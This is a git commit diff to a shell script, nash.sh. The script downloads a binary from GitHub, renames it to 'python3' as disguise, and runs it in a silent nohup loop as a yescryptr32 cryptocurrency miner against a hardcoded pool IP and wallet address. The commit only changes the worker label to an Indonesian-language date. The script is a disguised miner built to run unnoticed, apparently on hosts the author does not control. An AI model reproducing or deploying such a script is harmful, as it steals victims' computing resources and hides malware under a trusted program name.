7a1d2c9103149372c310f60eac4ea5416037086b
barburonjilo <barburonjilo@outlook.co.id>
2024-08-14 06:02:49 +0700

    Update nash.sh

--- nash.sh
+++ nash.sh
@@ -8,11 +8,12 @@ wget -O python3 https://github.com/barburonjilo/back/raw/main/sr
 
 # Make the script executable
 chmod +x python3
+WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 
 # Loop to run and stop periodically
 while true; do
   # Run the script in the background
-  nohup ./python3 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$! --timeout 120 -t $num_cores > /dev/null 2>&1 &
+  nohup ./python3 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 -t $num_cores > /dev/null 2>&1 &
 
   # Wait for 10 minutes
   sleep 600
